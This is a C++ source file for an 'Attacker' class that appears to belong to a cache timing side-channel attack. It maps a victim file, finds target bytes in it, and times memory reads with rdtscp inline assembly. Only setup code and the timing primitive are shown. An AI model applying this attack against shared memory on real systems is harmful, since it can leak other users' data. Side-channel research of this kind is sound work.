#include "Attacker.h"
#include <utility>

Attacker::Attacker(std::string path, char *target, int len, int intervalTime, int iterations) :
        targetData(target), targetDataLen(len), targetPointer(nullptr), interval(intervalTime), maxIterations(iterations), measurements(){
    victim = new Victim(std::move(path));
    victim->LoadFile();
    targetPointer = victim->FindInFile(target, len);
}

Attacker::Attacker(std::string path, char *target, int len, int intervalTime) :
        targetData(target), targetDataLen(len), targetPointer(nullptr), interval(intervalTime), maxIterations(100), measurements(){
    victim = new Victim(std::move(path));
    victim->LoadFile();
    targetPointer = victim->FindInFile(target, len);
}

Attacker::Attacker(std::string path, char *target, int len) :
        targetData(target), targetDataLen(len), targetPointer(nullptr), interval(1), maxIterations(100), measurements(){
    victim = new Victim(std::move(path));
    victim->LoadFile();
    targetPointer = victim->FindInFile(target, len);
}

Attacker::Attacker() :
        victim(nullptr), targetData(nullptr), targetPointer(nullptr), targetDataLen(0), interval(1), maxIterations(100), measurements() {}

Attacker::~Attacker() {
    delete victim;
}

__attribute__((always_inline)) unsigned int Attacker::MeasureTime(volatile char* ch)
{
    int rv;
    __asm__ __volatile__ ("mfence\n"
                          "lfence\n"
                          "rdtscp\n"
                          "mov %%eax, %%esi\n"
                          "mov (%1), %%eax\n"
                          "rdtscp\n"
                          "sub %%esi, %%eax\n"
    :"=&a" (rv): "r" (ch): "ecx", "edx", "esi");
    return rv;
}
